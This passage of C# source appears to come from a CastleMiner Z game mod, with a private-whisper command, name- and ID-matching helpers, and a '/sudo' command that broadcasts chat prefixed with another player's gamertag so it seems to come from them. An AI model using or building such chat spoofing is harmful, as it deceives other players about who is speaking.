            if (args.Length < 2)
            {
                SendLog("ERROR: Command usage /privatechat [to gamer] [message(/check)]");
                return;
            }

            try
            {
                // Arg0 = target (partial ok), Arg1..N = message (keep spaces intact).
                string toGamer = args[0] ?? string.Empty;                           // Who to send to (partial ok).
                string message = string.Join(" ", args, 1, args.Length - 1).Trim(); // Everything after target.

                if (message.Length == 0)
                {
                    SendLog("ERROR: Message cannot be empty.");
                    return;
                }

                // Session locals.
                var ourGamer  = CastleMinerZGame.Instance.MyNetworkGamer;
                var allGamers = CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers;

                // Attempt to resolve exactly one target.
                if (!NameMatchUtils.TryFindGamerByQuery(allGamers, ourGamer, toGamer, out NetworkGamer target, out string reason))
                {
                    SendLog(reason ?? "ERROR: No matching player.");
                    return;
                }

                if (message == "/check")
                {
                    SendLog($"PrivateMessageDebug -- Resolved User: '{target.Gamertag}'.");
                    return;
                }

                // Send: Prefix the message with our gamertag so the recipient sees context.
                string header = (_cmdRaw) ? string.Empty : $"[{ourGamer.Gamertag} -> whispered]: ";
                SendPrivateChatMessage((LocalNetworkGamer)ourGamer, ((Player)target.Tag).Gamer, header + message);

                // Local confirmation.
                SendLog($"[whisper -> {NameMatchUtils.SafeName(target)}] {message}");
            }
            catch (Exception ex)
            {
                // Defensive: Surface unexpected errors without crashing the command handler.
                SendLog($"ERROR: {ex.Message}");
            }

            // Sends a single-recipient chat packet (direct/unicast).
            void SendPrivateChatMessage(LocalNetworkGamer from, NetworkGamer to, string message)
            {
                // Define the send instance message type.
                var sendInstance = MessageBridge.Get<BroadcastTextMessage>();

                // Packet fields.
                sendInstance.Message = message;

                // Send only to the targeted player.
                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
        }
        #endregion

        #region /sudo

        [Command("/sudo")]
        private static void ExecuteSudo(string[] args)
        {
            if (args.Length < 2)
            {
                SendLog("ERROR: Command usage /sudo [gamer|id:##] [message(/check)]");
                return;
            }

            try
            {
                // Arg0 = target token, Arg1..N = message (keep spaces intact).
                string toGamer = args[0] ?? string.Empty;
                string message = string.Join(" ", args, 1, args.Length - 1).Trim();

                if (message.Length == 0)
                {
                    SendLog("ERROR: Message cannot be empty.");
                    return;
                }

                // Session locals.
                var ourGamer  = CastleMinerZGame.Instance.MyNetworkGamer;
                var allGamers = CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers;

                // Attempt to resolve exactly one target:
                // - "/sudo id:2 hello"
                // - "/sudo someName hello"
                NetworkGamer target;
                string reason;

                if (NameMatchUtils.TryParseGamerIdToken(toGamer, out byte id))
                {
                    if (!NameMatchUtils.TryFindGamerById(allGamers, ourGamer, id, out target, out reason))
                    {
                        SendLog(reason ?? "ERROR: No matching player.");
                        return;
                    }
                }
                else
                {
                    if (!NameMatchUtils.TryFindGamerByQuery(allGamers, ourGamer, toGamer, out target, out reason))
                    {
                        SendLog(reason ?? "ERROR: No matching player.");
                        return;
                    }
                }

                if (message == "/check")
                {
                    SendLog($"SudoMessageDebug -- Resolved User: '{target.Gamertag}' (id:{target.Id}).");
                    return;
                }

                // Send: Prefix the message with the targets gamertag so the server sees context.
                string header = $"{target.Gamertag}: ";
                BroadcastTextMessage.Send((LocalNetworkGamer)ourGamer, header + message);
            }
            catch (Exception ex)
            {
                SendLog($"ERROR: {ex.Message}");
            }
        }
        #endregion

        #endregion

        #region Helpers

        /// <summary>
        /// Resolves a NetworkGamer from a user-supplied name fragment.
        /// Also hosts normalization and safe-name helpers used by the resolver.
        /// </summary>
        #region Name Match Utils

        internal static class NameMatchUtils
        {
            /// <summary>
            /// Resolves one <see cref="NetworkGamer"/> from a partial, case-insensitive query.
            /// - Excludes the local player.
            /// - Ranking: Exact (score 0) > Prefix (1) > Substring (2+index).
            /// - On ambiguity at the best score, returns false with a suggestion list in <paramref name="error"/>.
            /// </summary>
            /// <param name="gamers">All gamers in the session.</param>
            /// <param name="self">The local gamer (excluded from matches).</param>
            /// <param name="query">User-supplied name fragment.</param>
            /// <param name="match">Resolved gamer on success; null on failure.</param>
            /// <param name="error">Reason string on failure (no/ambiguous match).</param>
            /// <returns>true if exactly one best match was found; otherwise false.</returns>
            public static bool TryFindGamerByQuery(
                IEnumerable<NetworkGamer> gamers,
                NetworkGamer self,
                string query,
                out NetworkGamer match,
                out string error)
            {
                match = null;
                error = null;

                if (string.IsNullOrWhiteSpace(query))
                {
                    error = "ERROR: Missing player name.";
                    return false;
                }

                string qNorm = Normalize(query);

                // Collect candidates (exclude self).
                var list = new List<Cand>(16);
                foreach (var g in gamers)
                {
                    if (g == null || g == self) continue;

                    string name = SafeName(g);
                    if (name.Length == 0) continue;

                    string nNorm = Normalize(name);

                    // Rank: 0 = exact, 1 = prefix, 2+idx = substring (smaller is better).
                    int score = int.MaxValue;
                    if (string.Equals(nNorm, qNorm, StringComparison.Ordinal))
                        score = 0;
                    else if (nNorm.StartsWith(qNorm, StringComparison.Ordinal))
                        score = 1;
                    else
                    {
                        int idx = nNorm.IndexOf(qNorm, StringComparison.Ordinal);
                        if (idx >= 0) score = 2 + idx;
                    }

                    if (score != int.MaxValue)
                        list.Add(new Cand { Gamer = g, Name = name, Score = score });
                }

                if (list.Count == 0)
                {
                    error = $"ERROR: No player matching \"{query}\".";
                    return false;
                }

                // Pick best; break ties by shorter name, then alphabetical (case-insensitive).
                list.Sort((a, b) =>
                {
                    int c = a.Score.CompareTo(b.Score);
                    if (c != 0) return c;
                    c = a.Name.Length.CompareTo(b.Name.Length);
                    if (c != 0) return c;
                    return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
                });

                // If ambiguous among equal-best scores, surface suggestions (up to 5).
                int bestScore = list[0].Score;
                int sameTop = 0;
                for (int i = 0; i < list.Count && list[i].Score == bestScore; i++) sameTop++;

                if (sameTop > 1)
                {
                    var sb = new System.Text.StringBuilder();
                    sb.Append("ERROR: Ambiguous player. Did you mean: ");
                    for (int i = 0; i < sameTop && i < 5; i++)
                    {
                        if (i > 0) sb.Append(", ");
                        sb.Append(list[i].Name);
                    }
                    if (sameTop > 5) sb.Append(", ...");
                    error = sb.ToString();
                    return false;
                }

                match = list[0].Gamer;
                return true;
            }

            /// <summary>
            /// Lightweight candidate for ranking and display during name resolution.
            /// </summary>
            struct Cand { public NetworkGamer Gamer; public string Name; public int Score; }

            /// <summary>
            /// Normalizes a gamer name or query for matching:
            /// - Lowercases invariant.
            /// - Strips spaces, underscores, and dashes to tolerate minor differences.
            /// </summary>
            static string Normalize(string s)
            {
                if (string.IsNullOrEmpty(s)) return string.Empty;

                // Lowercase and strip spaces/underscores/dashes for flexible matching.
                var sb = new System.Text.StringBuilder(s.Length);
                for (int i = 0; i < s.Length; i++)
                {
                    char ch = s[i];
                    if (ch == ' ' || ch == '_' || ch == '-') continue;
                    sb.Append(char.ToLowerInvariant(ch));
                }
                return sb.ToString();
            }

            /// <summary>
            /// Safely obtains a display name for a gamer:
            /// prefers Player.Gamer.Gamertag (if Tag is a Player) else falls back to NetworkGamer.Gamertag.
            /// Never throws; returns empty string on failure.
            /// </summary>
            public static string SafeName(NetworkGamer g)
            {
                try
                {
                    // Prefer the nested Player.Gamer.Gamertag if present, else NetworkGamer.Gamertag.
                    var networkGamer = (g.Tag is Player p) ? p.Gamer : null;
                    string name      = (networkGamer != null && networkGamer.Gamertag != null) ? networkGamer.Gamertag : g.Gamertag;
                    return name      ?? string.Empty;
                }
                catch { return string.Empty; }
            }

            /// <summary>
            /// Parses "id:2" (case-insensitive) into a byte gamer id.
            /// Accepts: "id:2", "ID:2", "id=2".
            /// </summary>
            public static bool TryParseGamerIdToken(string token, out byte id)
            {
                id = 0;

                if (string.IsNullOrWhiteSpace(token))
                    return false;

                token = token.Trim();

                // Support "id:2" or "id=2".
                const StringComparison cmp = StringComparison.OrdinalIgnoreCase;

                if (token.StartsWith("id:", cmp))
                    token = token.Substring(3).Trim();
                else if (token.StartsWith("id=", cmp))
                    token = token.Substring(3).Trim();
                else
                    return false;

                // Parse 0..255.
                if (!int.TryParse(token, out int tmp))
                    return false;

                if (tmp < 0 || tmp > 255)
                    return false;

                id = (byte)tmp;
                return true;
            }

            /// <summary>
            /// Resolves one NetworkGamer by exact NetworkGamer.Id.
            /// - Excludes the local player.
            /// </summary>
            public static bool TryFindGamerById(
                IEnumerable<NetworkGamer> gamers,
                NetworkGamer self,
                byte id,
                out NetworkGamer match,
                out string error)
            {
                match = null;
                error = null;

                foreach (var g in gamers)
                {
                    if (g == null || g == self) continue;
                    if (g.Id == id)
                    {
                        match = g;
                        return true;
                    }
                }

                error = $"ERROR: No player with id:{id}.";
                return false;
            }
        }
        #endregion

        #region ID Match Utils

        /// <summary>
        /// Small helpers for working with NetworkGamer.Id lists:
        /// - Convert selected ids into a readable gamertag list for UI/logging.
        /// - Check whether an id exists in an id array (simple linear scan).
        /// </summary>
        internal static class IdMatchUtils
        {
            /// <summary>
            /// Converts an array of gamer ids into a comma-separated list of gamertags.
            /// - Uses the current session's AllGamers to resolve ids to names.
            /// - Preserves session order (so output is stable and readable).
            /// - Returns "(None)" when ids is null/empty or no matches were found.
            /// </summary>
            public static string IdToGamertag(byte[] ids)
            {
                if (ids == null || ids.Length == 0) return "(None)";

                var session = CastleMinerZGame.Instance?.CurrentNetworkSession;
                if (session == null) return "(no session)";

                var sb = new StringBuilder(64);
                bool first = true;

                foreach (NetworkGamer g in session.AllGamers)
                {
                    if (g == null) continue;
                    if (!ContainsId(ids, g.Id)) continue;

                    if (!first) sb.Append(", ");
                    sb.Append(g.Gamertag);

                    first = false;
                }

                return first ? "(None)" : sb.ToString();
            }

            /// <summary>
            /// Resolves a single gamer id into a gamertag string.
            /// - Uses the current session's AllGamers to resolve the id.
            /// - Returns "(None)" if the id is not found (or session is missing).
            /// </summary>
            public static string IdToGamertag(byte id)
            {
                var session = CastleMinerZGame.Instance?.CurrentNetworkSession;
                if (session == null) return "(no session)";

                foreach (NetworkGamer g in session.AllGamers)
                {
                    if (g == null) continue;
                    if (g.Id == id)
                        return g.Gamertag ?? string.Empty;
                }

                return "(None)";
            }

            /// <summary>
            /// Returns true if <paramref name="id"/> is present in <paramref name="ids"/>; otherwise false.
            /// - Simple O(n) scan (fast enough for small player lists).
            /// </summary>
            public static bool ContainsId(byte[] ids, byte id)
            {
                for (int i = 0; i < ids.Length; i++)
                    if (ids[i] == id) return true;
                return false;
            }
        }
        #endregion

        #endregion

        #endregion
    }
}